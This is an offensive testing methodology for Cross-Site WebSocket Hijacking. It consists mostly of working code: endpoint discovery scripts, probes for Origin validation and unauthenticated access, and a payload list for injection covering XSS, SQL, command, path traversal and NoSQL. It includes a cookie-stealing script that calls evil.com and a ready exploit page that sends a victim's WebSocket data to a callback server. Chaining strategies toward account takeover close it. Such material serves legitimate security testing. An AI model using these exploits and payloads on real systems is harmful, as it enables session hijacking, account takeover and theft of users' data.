# WebSocket Hijacking (CSWSH) — Deep Testing Methodology

## Overview
Cross-Site WebSocket Hijacking (CSWSH) is a **P1/Critical** vulnerability class where an attacker can hijack an authenticated WebSocket connection from a victim's browser. Unlike CSRF, WebSocket hijacking gives the attacker a **persistent, bidirectional channel** into the authenticated session.

## Why This Matters
- WebSockets often bypass CSRF tokens entirely
- Many apps use WS for real-time features (chat, notifications, trading) with sensitive data
- A successful CSWSH gives the attacker full read/write access to the WS channel
- Often chainable into account takeover, data exfiltration, or RCE

## Detection Methodology

### Step 1: Identify WebSocket Endpoints
```bash
# Look for WebSocket upgrade in JavaScript
curl -s https://TARGET/ | grep -oP '(wss?://[^\s"'\'']+|new\s+WebSocket\s*\([^\)]+\))'

# Check common WebSocket paths
for path in /ws /websocket /socket /socket.io /sockjs /cable /hub /signalr /graphql-ws /subscriptions; do
  STATUS=$(curl -s -o /dev/null -w '%{http_code}' -H "Upgrade: websocket" -H "Connection: Upgrade" -H "Sec-WebSocket-Version: 13" -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" "https://TARGET${path}")
  echo "$path → $STATUS"
done
```

### Step 2: Test Origin Validation
```python
import asyncio
import websockets

async def test_cswsh():
    target_ws = "wss://TARGET/ws"
    
    # Test 1: No Origin header
    try:
        async with websockets.connect(target_ws) as ws:
            print("[VULN] WebSocket accepts connections without Origin header")
            await ws.send('{"type":"ping"}')
            resp = await asyncio.wait_for(ws.recv(), timeout=5)
            print(f"  Response: {resp}")
    except Exception as e:
        print(f"  No Origin: {e}")
    
    # Test 2: Attacker-controlled Origin
    evil_origins = [
        "https://evil.com",
        "https://TARGET.evil.com",
        "https://evil-TARGET",
        "null",
    ]
    for origin in evil_origins:
        try:
            headers = {"Origin": origin}
            async with websockets.connect(target_ws, extra_headers=headers) as ws:
                print(f"[VULN] WebSocket accepts Origin: {origin}")
                await ws.send('{"type":"ping"}')
                resp = await asyncio.wait_for(ws.recv(), timeout=5)
                print(f"  Response: {resp}")
        except Exception as e:
            print(f"  Origin {origin}: {e}")

asyncio.run(test_cswsh())
```

### Step 3: Test Authentication on WebSocket
```python
import asyncio
import websockets

async def test_ws_auth():
    target_ws = "wss://TARGET/ws"
    
    # Test without any cookies/tokens
    try:
        async with websockets.connect(target_ws) as ws:
            # Try to access authenticated actions
            payloads = [
                '{"action":"get_profile"}',
                '{"action":"list_users"}',
                '{"action":"get_messages"}',
                '{"type":"subscribe","channel":"admin"}',
                '{"query":"{ me { email role } }"}',  # GraphQL over WS
            ]
            for p in payloads:
                await ws.send(p)
                try:
                    resp = await asyncio.wait_for(ws.recv(), timeout=3)
                    print(f"[VULN] Unauthenticated WS response to {p[:50]}:")
                    print(f"  {resp[:200]}")
                except asyncio.TimeoutError:
                    pass
    except Exception as e:
        print(f"Auth test: {e}")

asyncio.run(test_ws_auth())
```

### Step 4: WebSocket Message Injection
```python
# Test for injection in WebSocket messages
injection_payloads = [
    # XSS via WebSocket
    '{"message":"<img src=x onerror=alert(1)>"}',
    '{"message":"<script>fetch(\'https://evil.com/?\'+document.cookie)</script>"}',
    
    # SQL injection via WebSocket
    '{"query":"1\' OR 1=1--"}',
    '{"id":"1 UNION SELECT username,password FROM users--"}',
    
    # Command injection
    '{"filename":"test;cat /etc/passwd"}',
    '{"cmd":"$(whoami)"}',
    
    # SSTI
    '{"template":"{{7*7}}"}',
    '{"name":"${7*7}"}',
    
    # Path traversal
    '{"file":"../../../etc/passwd"}',
    
    # NoSQL injection
    '{"username":{"$gt":""},"password":{"$gt":""}}',
    
    # Prototype pollution
    '{"__proto__":{"isAdmin":true}}',
    '{"constructor":{"prototype":{"isAdmin":true}}}',
]
```

### Step 5: CSWSH Exploit PoC
```html
<!-- Save as exploit.html and open in victim's browser -->
<html>
<body>
<script>
// CSWSH Exploit — steals data via hijacked WebSocket
var ws = new WebSocket("wss://TARGET/ws");
var exfil = "https://YOUR-CALLBACK-SERVER/log?data=";

ws.onopen = function() {
    // Send commands as the authenticated user
    ws.send(JSON.stringify({action: "get_profile"}));
    ws.send(JSON.stringify({action: "list_messages"}));
    ws.send(JSON.stringify({action: "get_api_keys"}));
};

ws.onmessage = function(event) {
    // Exfiltrate all responses
    fetch(exfil + btoa(event.data));
};
</script>
</body>
</html>
```

## Socket.IO Specific Testing
```python
import socketio

sio = socketio.Client()

@sio.event
def connect():
    print("[+] Connected to Socket.IO")
    sio.emit("authenticate", {"token": "invalid"})
    sio.emit("join", {"room": "admin"})
    sio.emit("get_users", {})

@sio.on("*")
def catch_all(event, data):
    print(f"[DATA] {event}: {data}")

# Test without auth
sio.connect("https://TARGET", headers={"Origin": "https://evil.com"})
```

## SignalR Specific Testing
```bash
# Negotiate connection
curl -s "https://TARGET/hub/negotiate" -X POST | jq .

# Test without auth  
curl -s "https://TARGET/hub" \
  -H "Upgrade: websocket" \
  -H "Connection: Upgrade"
```

## Severity Classification
| Finding | Severity | CVSS |
|---------|----------|------|
| CSWSH with data exfiltration | Critical | 9.1 |
| CSWSH with action execution | Critical | 9.3 |
| Unauthenticated WS access to sensitive data | High | 7.5 |
| WS message injection (stored XSS via WS) | High | 7.1 |
| Missing Origin validation (no sensitive data) | Medium | 5.3 |
| WS accepts null Origin | Medium | 4.3 |

## Chaining Strategies
1. **CSWSH → Account Takeover**: Hijack WS → change email/password → take over account
2. **CSWSH → Data Exfil**: Hijack WS → subscribe to all channels → exfiltrate messages/PII
3. **WS Injection → Stored XSS**: Inject XSS payload via WS message → stored in chat/feed → execute in other users' browsers
4. **CSWSH → Admin Actions**: Hijack admin's WS → execute admin commands (user management, config changes)
5. **WS + IDOR**: Enumerate other users' data by manipulating IDs in WS messages
